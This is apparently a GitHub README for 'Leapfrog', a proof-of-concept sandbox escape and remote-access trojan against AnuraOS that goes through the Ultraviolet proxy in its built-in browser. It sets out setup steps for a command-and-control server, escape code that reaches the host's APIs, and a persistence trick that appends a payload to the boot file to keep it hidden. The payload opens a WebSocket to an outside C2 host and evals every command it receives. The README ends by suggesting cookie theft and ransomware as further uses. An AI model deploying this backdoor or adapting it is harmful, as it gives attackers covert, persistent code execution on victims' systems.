# Leapfrog
PoC sandbox escape & RCE/RAT for [AnuraOS](https://github.com/mercuryworkshop/anuraos)

## Setup
1. Clone the repo
```sh
$ git clone https://github.com/entrpixx/leapfrog
$ cd leapfrog
```
2. Setup the C2 server
```sh
$ cd c2
$ pnpm i
$ pnpm start # This starts the C2 server on port 2347
```
3. Serve `public/`

### Example Caddy Config
```
leapfrog.entr.pics {
    root * /srv/leapfrog/public
    file_server

    handle_path /ws/* {
        reverse_proxy localhost:2347
    }
}
```

## Usage
1. In AboutBrowser in Anura, navigate to your URL.
2. Once the page has fully loaded, reload the AnuraOS page/tab.
3. Then, once boot has finished, execute any JS code you want into the C2 console (E.g. `anura.dialog.alert("test");`)

## How?
AboutBrowser, The web browser used by AnuraOS, uses [Ultraviolet](https://github.com/titaniumnetwork-dev/ultraviolet) as its webproxy.
In UV, you can escape its rewriter/"sandbox" by using code like this:
```js
(async function () {})
    .constructor("return top.anura")()
    .then(async (anura) => {
      anura.dialog.alert("test");
    })
```
`top.anura` gives you full access to Anura's APIs.
From here, you can append a payload to the end of Anura's boot file (`/anura_files/lib/Boot.js`).
While Anura does have init scripts, adding the payload directly to the boot file makes it more hidden.
Once Anura boots, it'll execute the payload.
The payload itself is fairly simple:
```js
setTimeout(() => {
    globalThis.__lf$ws = new anura.net.WebSocket("wss://leapfrog.entr.pics/ws/");
    globalThis.__lf$ws.addEventListener("message", (ev) => {
        eval(ev.data);
    });
}, 500)
```
It creates a WebSocket connection to your C2 server and runs `eval()` on any messages sent from the server.

## What Else Could You Do?
Quite a bit! Just to name a few idea's:
- Cookie stealer
- Ransomware
- "Kernel" level code execution
  - All files are stored locally in Anura's FS. The [SW](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) will call `importScripts()` on paths that reside inside of the FS. This means you append code to the end of the files the SW is importing and execute code inside of Anura's SW.
  - For context, the SW is like Anura's kernel
